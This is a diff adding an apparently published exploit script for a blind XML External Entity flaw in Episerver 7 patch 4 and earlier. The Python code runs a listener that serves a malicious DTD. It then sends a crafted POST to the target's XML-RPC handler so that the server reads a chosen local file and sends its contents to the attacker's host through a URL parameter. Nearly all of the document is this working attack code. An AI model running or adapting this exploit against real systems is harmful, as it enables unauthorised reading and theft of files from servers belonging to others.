@@ -1,0 +1,113 @@
+# Exploit Title: Episerver 7 patch 4 - XML External Entity Injection
+# Google Dork: N/A
+# Date: 2018-08-28
+# Exploit Author: Jonas Lejon
+# Vendor Homepage: https://www.episerver.se/
+# Version: Episerver 7 patch 4 and below
+# CVE : N/A
+
+## episploit.py - Blind XXE file read exploit for Episerver 7 patch 4 and below
+## Starts a listening webserver, so the exploits needs a public IP and unfiltered port, configure RHOST below!
+## Usage: ./episploit.py <target> [file-to-read]
+
+#!/usr/bin/python
+
+from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
+import urllib
+import re
+import sys
+import time
+import threading
+import socket
+
+SERVER_SOCKET 	= ('0.0.0.0', 8000)
+EXFIL_FILE 		= 'file:///c:/windows/win.ini' 
+
+# The public facing IP. Change this
+RHOST 			= '1.2.3.4:' + str(SERVER_SOCKET[1])
+
+EXFILTRATED_EVENT = threading.Event()
+
+class BlindXXEServer(BaseHTTPRequestHandler):
+
+	def response(self, **data):
+		code = data.get('code', 200)
+		content_type = data.get('content_type', 'text/plain')
+		body = data.get('body', '')
+
+		self.send_response(code)
+		self.send_header('Content-Type', content_type)
+		self.end_headers()
+		self.wfile.write(body.encode('utf-8'))
+		self.wfile.close()
+
+	def do_GET(self):
+		self.request_handler(self)
+
+	def do_POST(self):
+		self.request_handler(self)
+
+	def log_message(self, format, *args):
+		return
+
+	def request_handler(self, request):
+		global EXFILTRATED_EVENT
+
+		path = urllib.unquote(request.path).decode('utf8')
+		m = re.search('\/\?exfil=(.*)', path, re.MULTILINE)
+		if m and request.command.lower() == 'get':
+			data = path[len('/?exfil='):]
+			print 'Exfiltrated %s:' % EXFIL_FILE
+			print '-' * 30
+			print urllib.unquote(data).decode('utf8')
+			print '-' * 30 + '\n'
+			self.response(body='true')
+
+			EXFILTRATED_EVENT.set()
+
+		elif request.path.endswith('.dtd'):
+			print 'Sending malicious DTD file.'
+			dtd = '''<!ENTITY %% param_exfil SYSTEM "%(exfil_file)s">
+<!ENTITY %% param_request "<!ENTITY exfil SYSTEM 'http://%(exfil_host)s/?exfil=%%param_exfil;'>">
+%%param_request;''' % {'exfil_file' : EXFIL_FILE, 'exfil_host' : RHOST}
+
+			self.response(content_type='text/xml', body=dtd)
+
+		else:
+			print '[INFO] %s %s' % (request.command, request.path)
+			self.response(body='false')
+
+def send_stage1(target):
+	content = '''<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://''' + RHOST + '''/test.dtd"><foo>&exfil;</foo>'''
+	payload = '''POST /util/xmlrpc/Handler.ashx?pageid=1023 HTTP/1.1
+Host: ''' + target + '''
+User-Agent: curl/7.54.0
+Accept: */*
+Content-Length: ''' + str(len(content)) + '''
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+''' + content
+
+	print "Sending payload.."
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	port = 80
+	s.connect((target,port))
+	s.send(payload)
+
+def main(target):
+	server = HTTPServer(SERVER_SOCKET, BlindXXEServer)
+	thread = threading.Thread(target=server.serve_forever)
+	thread.daemon = True
+	thread.start()
+	send_stage1(target)
+
+	while not EXFILTRATED_EVENT.is_set():
+		pass
+
+if __name__ == '__main__':
+	if len(sys.argv) > 1:
+		target = sys.argv[1]
+	if len(sys.argv) > 2:
+		EXFIL_FILE = sys.argv[2]
+	main(target)
